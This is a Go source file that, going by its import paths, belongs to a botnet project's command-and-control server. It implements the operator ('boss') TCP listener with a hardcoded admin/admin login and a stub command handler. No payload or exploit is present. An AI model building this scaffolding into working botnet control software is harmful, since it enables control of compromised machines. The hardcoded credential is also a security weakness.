package boss

import (
	"bufio"
	"errors"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"

	"github.com/phanletrunghieu/botnet/common/cmd"

	"github.com/satori/go.uuid"

	"github.com/phanletrunghieu/botnet/server/domain"
)

// Service struct
type Service struct {
	listener net.Listener
	Bosses   []*domain.Boss
	Error    chan error
}

// NewBossService create tcpService struct
func NewBossService(port int) *Service {
	ln, err := net.Listen("tcp", ":"+strconv.Itoa(port))

	service := &Service{
		listener: ln,
		Error:    make(chan error),
	}

	if err != nil {
		service.Error <- err
	}

	return service
}

// Run wait for a connection
func (s *Service) Run() {
	s.acceptConnection()
}

func (s *Service) acceptConnection() {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			s.Error <- err
			continue
		}

		boss := &domain.Boss{
			ID:   uuid.NewV4(),
			Addr: conn.RemoteAddr(),
			Conn: conn,
		}

		if err := s.authenticate(boss); err != nil {
			s.Error <- err
			continue
		}

		s.Bosses = append(s.Bosses, boss)
		go s.handleConnection(boss)
	}
}

func (s *Service) authenticate(boss *domain.Boss) error {
	msg, err := bufio.NewReader(boss.Conn).ReadString('\r')
	if err != nil {
		return err
	}

	msg = strings.TrimSpace(msg)
	userInfo := strings.Split(msg, " ")
	if len(userInfo) != 2 {
		return errors.New("Fail to authenticate")
	}

	if userInfo[0] != "admin" || userInfo[1] != "admin" {
		return errors.New("Fail to authenticate")
	}

	boss.IsAuthenticated = true
	log.Println("Authenticated!")

	return nil
}

func (s *Service) handleConnection(boss *domain.Boss) {
	for {
		buffCommand := make([]byte, 2)
		_, err := boss.Conn.Read(buffCommand)
		if err != nil {
			s.Error <- err
			return
		}

		log.Println(string(buffCommand))

		switch string(buffCommand) {
		case cmd.ListBosses:
			fmt.Fprintf(boss.Conn, "lsdasda\n\r")
			break
		}
	}
}
